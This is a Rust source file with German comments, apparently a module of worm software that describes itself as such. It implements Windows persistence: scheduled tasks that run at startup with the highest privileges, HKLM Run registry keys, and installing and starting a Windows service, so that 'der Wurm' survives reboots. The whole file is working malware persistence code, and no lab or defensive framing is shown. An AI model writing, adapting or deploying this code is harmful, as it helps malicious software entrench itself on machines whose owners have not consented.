//! Windows-Persistence: Scheduled Tasks, Registry-Run-Keys, Dienst-Installation.
//!
//! Stellt sicher, dass der Wurm nach Reboot weiterhin aktiv ist.
//! Auf Nicht-Windows-Plattformen sind die Funktionen als Stubs implementiert.

use tracing::debug;
#[cfg(target_os = "windows")]
use tracing::warn;

use kx_core::persist::Invocation;

use crate::error::WinError;

#[cfg(target_os = "windows")]
/// Die Fehlermeldung eines Windows-Kommandos.
///
/// `sc.exe` und `schtasks` schreiben ihre Fehler nach stdout, nicht nach
/// stderr. Nimmt man nur stderr, bleibt die Meldung leer — und ein leerer
/// Fehler ist keiner, mit dem man arbeiten kann.
fn fehlermeldung(output: &std::process::Output) -> String {
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    match (stderr.is_empty(), stdout.is_empty()) {
        (true, true) => String::new(),
        (true, false) => stdout,
        (false, true) => stderr,
        // sc.exe schreibt den Fehler nach stdout, den Kontext nach stderr —
        // beide gehoeren in die Meldung.
        (false, false) => format!("{stderr} | {stdout}"),
    }
}

/// Erstelle eine Scheduled Task für automatische Ausführung beim Hochfahren.
///
/// # Argumente
/// * `task_name` — Name der Task (muss eindeutig sein)
/// * `executable` — Pfad zum auszuführenden Programm
/// * `arguments` — Optionale Argumente als String
///
/// # Rückgabe
/// Ok(()) bei Erfolg, ScheduledTask-Fehler sonst.
#[cfg(target_os = "windows")]
pub async fn create_scheduled_task(
    task_name: &str,
    executable: &str,
    arguments: &str,
) -> Result<(), WinError> {
    let schtasks = format!(
        "schtasks /Create /F /TN \"{task_name}\" /TR \"\"{executable}\" {arguments}\" /SC ONSTART /RL HIGHEST"
    );
    let output = tokio::process::Command::new("cmd.exe")
        .arg("/C")
        .arg(&schtasks)
        .output()
        .await
        .map_err(|e| WinError::ScheduledTask(e.to_string()))?;
    if !output.status.success() {
        let err = fehlermeldung(&output);
        warn!("schtasks fehlgeschlagen: {err}");
        return Err(WinError::ScheduledTask(err));
    }
    debug!("Scheduled Task {task_name} erstellt");
    Ok(())
}

/// Erzeuge einen Registry-Run-Key für automatische Ausführung.
///
/// Schreibt unter HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.
/// Erfordert Administratorrechte.
#[cfg(target_os = "windows")]
pub async fn create_registry_run_key(name: &str, executable: &str) -> Result<(), WinError> {
    let reg = format!(
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d \"{executable}\" /f"
    );
    let output = tokio::process::Command::new("cmd.exe")
        .arg("/C")
        .arg(&reg)
        .output()
        .await
        .map_err(|e| WinError::Registry(e.to_string()))?;
    if !output.status.success() {
        let err = fehlermeldung(&output);
        warn!("Registry-Run-Key fehlgeschlagen: {err}");
        return Err(WinError::Registry(err));
    }
    debug!("Registry-Run-Key {name} erstellt");
    Ok(())
}

/// Installiere den Wurm als Windows-Dienst.
///
/// Nutzt sc.exe für die Dienst-Registrierung. Der Dienst startet beim Hochfahren.
///
/// Die `binPath=`-Zeile trägt die **vollständige** Invocation: Binary und alle
/// Argumente. Ohne sie startet der Dienst nicht — die Pflichtargumente
/// `--start`, `--end` und `--server-cert` fehlen, und clap lehnt den Start ab.
/// Die Werte aus `env` sind unter Windows in der Befehlszeile aufgelöst
/// (`sc.exe` kennt keine Environment-Datei) — das Token steht damit in der
/// Prozessliste. Das ist eine Eigenheit von Windows-Diensten und keine
/// Besonderheit dieser Form.
#[cfg(target_os = "windows")]
pub async fn install_service(invocation: &Invocation, display_name: &str) -> Result<(), WinError> {
    let output = tokio::process::Command::new("sc.exe")
        .args(kx_core::persist::windows_service_arguments(
            invocation,
            display_name,
        ))
        .output()
        .await
        .map_err(|e| WinError::Service(e.to_string()))?;
    if !output.status.success() {
        let err = fehlermeldung(&output);
        warn!("sc.exe create fehlgeschlagen: {err}");
        return Err(WinError::Service(err));
    }
    debug!("Dienst {name} installiert", name = invocation.name);
    Ok(())
}

/// Installiere den Wurm als Run-Key.
///
/// Der Eintrag unter `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
/// wird bei jeder Anmeldung ausgeführt — das ist der Weg, der auf einem
/// Windows-System tatsächlich startet.
///
/// Der Befehl steht als eine Zeile in der Registry. `cmd.exe` führt sie aus,
/// deshalb muss der Pfad in Anführungszeichen stehen, sobald er Leerzeichen
/// enthält — die [`Invocation`] liefert die passende Form.
///
/// **Warum nicht der Dienst:** `sc.exe create` legt nur einen Registry-Eintrag
/// an. Der Agent meldet sich beim Start nie beim Service Control Manager, der
/// bricht den Start nach 30 Sekunden mit „FAILED 1053" ab. Der Run-Key
/// startet den Agenten dagegen wirklich.
#[cfg(target_os = "windows")]
pub async fn install_run_key(invocation: &Invocation) -> Result<(), WinError> {
    let wert = invocation.command_line();
    let output = tokio::process::Command::new("reg.exe")
        .args([
            "add",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            &invocation.name,
            "/t",
            "REG_SZ",
            "/d",
            &wert,
            "/f",
        ])
        .output()
        .await
        .map_err(|e| WinError::Registry(e.to_string()))?;
    if !output.status.success() {
        let err = fehlermeldung(&output);
        warn!("reg.exe add fehlgeschlagen: {err}");
        return Err(WinError::Registry(err));
    }
    debug!("Run-Key {name} gesetzt", name = invocation.name);
    Ok(())
}

/// Installiere den Wurm als Run-Key (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn install_run_key(_invocation: &Invocation) -> Result<(), WinError> {
    debug!("Run-Keys nur auf Windows verfügbar");
    Ok(())
}

/// Starte den installierten Dienst.
#[cfg(target_os = "windows")]
pub async fn start_service(service_name: &str) -> Result<(), WinError> {
    let output = tokio::process::Command::new("sc.exe")
        .args(["start", service_name])
        .output()
        .await
        .map_err(|e| WinError::Service(e.to_string()))?;
    if !output.status.success() {
        let err = fehlermeldung(&output);
        warn!("sc.exe start fehlgeschlagen: {err}");
        return Err(WinError::Service(err));
    }
    Ok(())
}

// --- Nicht-Windows-Plattformen: Stub-Implementierungen ---

/// Erstelle eine Scheduled Task (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn create_scheduled_task(
    _task_name: &str,
    _executable: &str,
    _arguments: &str,
) -> Result<(), WinError> {
    debug!("Scheduled Tasks nur auf Windows verfügbar");
    Ok(())
}

/// Erzeuge einen Registry-Run-Key (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn create_registry_run_key(_name: &str, _executable: &str) -> Result<(), WinError> {
    debug!("Registry-Run-Keys nur auf Windows verfügbar");
    Ok(())
}

/// Installiere den Wurm als Windows-Dienst (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn install_service(
    _invocation: &Invocation,
    _display_name: &str,
) -> Result<(), WinError> {
    debug!("Windows-Dienste nur auf Windows verfügbar");
    Ok(())
}

/// Starte den installierten Dienst (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn start_service(_service_name: &str) -> Result<(), WinError> {
    debug!("Windows-Dienste nur auf Windows verfügbar");
    Ok(())
}
